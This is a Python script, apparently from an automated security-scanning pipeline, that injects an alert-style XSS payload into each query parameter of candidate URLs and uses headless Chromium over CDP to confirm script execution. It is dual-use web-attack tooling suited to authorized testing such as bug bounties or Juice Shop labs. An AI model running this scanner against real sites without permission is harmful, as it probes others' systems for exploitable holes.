#!/usr/bin/env python3
"""Generic real-browser XSS verification. Takes candidate URLs already
discovered by earlier recon phases (each carrying >=1 query parameter),
substitutes the canonical XSS proof-of-concept payload
`<iframe src="javascript:alert('xss')">` into each parameter one at a time,
and uses a real headless Chromium via CDP to detect whether the payload
actually EXECUTES (a real `alert()`/`confirm()`/`prompt()` call fires) --
not just whether it is reflected verbatim in the response body, which is
all static tools (nuclei templates, dalfox pattern-matching) can tell you.
This is the same technique a human bug-bounty hunter uses to turn a
"looks reflected" signal into a confirmed finding; it assumes nothing about
the target beyond "it has a query parameter", so it generalizes to any web
application, not just Juice Shop.

argv[1] URL             target root URL (used only as a fallback/log label)
argv[2] CANDIDATE_URLS  csv of URLs, each already containing >=1 query param

Prints JSON: {"tested": N, "triggered": [{"url":..., "param":..., "test_url":...}]}
"""
import asyncio
import json
import os
import subprocess
import sys
import time
import urllib.parse
import urllib.request

import websockets

URL = sys.argv[1] if len(sys.argv) > 1 else ""
CANDIDATES = [u for u in (sys.argv[2].split(",") if len(sys.argv) > 2 and sys.argv[2] else []) if u.strip()]

PAYLOAD = "<iframe src=\"javascript:alert('xss')\">"

# Overrides the three dialog-producing globals to set a flag instead of
# blocking on a real (headless-incompatible) native dialog -- this is what
# lets us detect real script execution generically, without knowing anything
# about the target's own DOM structure.
HOOK_JS = """
(function(){
  window.__xss_triggered = false;
  var mark = function(){ window.__xss_triggered = true; };
  window.alert = mark;
  window.confirm = function(){ mark(); return true; };
  window.prompt = function(){ mark(); return null; };
})();
"""

udir = f"/tmp/cdp-xss-{os.getpid()}"
proc = subprocess.Popen(
    ["chromium", "--headless=new", "--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
     f"--user-data-dir={udir}", "--remote-debugging-port=9224", "about:blank"],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
)


def ws_url():
    for _ in range(15):
        try:
            data = json.load(urllib.request.urlopen("http://localhost:9224/json", timeout=2))
            for t in data:
                if t.get("type") == "page":
                    return t["webSocketDebuggerUrl"]
        except Exception:  # noqa: BLE001
            time.sleep(1)
    return None


def _payload_variants(raw_url: str, payload: str) -> list[tuple[str, str]]:
    """Returns [(param_name, mutated_url), ...] -- one mutated URL per query
    parameter found, each with ONLY that one parameter replaced so a trigger
    can be attributed to a specific parameter."""
    parsed = urllib.parse.urlparse(raw_url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return []
    out = []
    for i, (name, _value) in enumerate(params):
        mutated = list(params)
        mutated[i] = (name, payload)
        new_query = urllib.parse.urlencode(mutated)
        out.append((name, urllib.parse.urlunparse(parsed._replace(query=new_query))))
    return out


async def main() -> None:
    wsu = ws_url()
    if not wsu:
        print(json.dumps({"error": "no CDP target"}))
        return
    triggered: list[dict[str, str]] = []
    tested = 0
    async with websockets.connect(wsu, max_size=None) as ws:
        _id = 0

        async def send(method, params=None):
            nonlocal _id
            _id += 1
            await ws.send(json.dumps({"id": _id, "method": method, "params": params or {}}))
            return _id

        async def pump(seconds, want_id=None):
            result = None
            end = time.time() + seconds
            while time.time() < end:
                try:
                    msg = json.loads(await asyncio.wait_for(ws.recv(), timeout=1.5))
                except asyncio.TimeoutError:
                    continue
                except Exception:  # noqa: BLE001
                    break
                if want_id is not None and msg.get("id") == want_id:
                    result = (msg.get("result", {}).get("result", {}) or {}).get("value")
                    return result
            return result

        async def evaluate(expr, budget=3):
            i = await send("Runtime.evaluate", {"expression": expr, "returnByValue": True})
            return await pump(budget, want_id=i)

        for m in ("Page.enable", "Runtime.enable"):
            await send(m)
        # Installed once; CDP re-runs it on every subsequent document, so the
        # override survives across all the navigations below.
        await send("Page.addScriptToEvaluateOnNewDocument", {"source": HOOK_JS})

        for candidate in CANDIDATES[:15]:
            for param_name, mutated_url in _payload_variants(candidate, PAYLOAD):
                tested += 1
                await send("Page.navigate", {"url": mutated_url})
                await pump(2.5)
                result = await evaluate("window.__xss_triggered === true", budget=2)
                if result:
                    triggered.append({"url": candidate, "param": param_name, "test_url": mutated_url})
                await evaluate("window.__xss_triggered = false", budget=1)

    print(json.dumps({"tested": tested, "triggered": triggered}, indent=2))


try:
    asyncio.run(main())
finally:
    proc.kill()
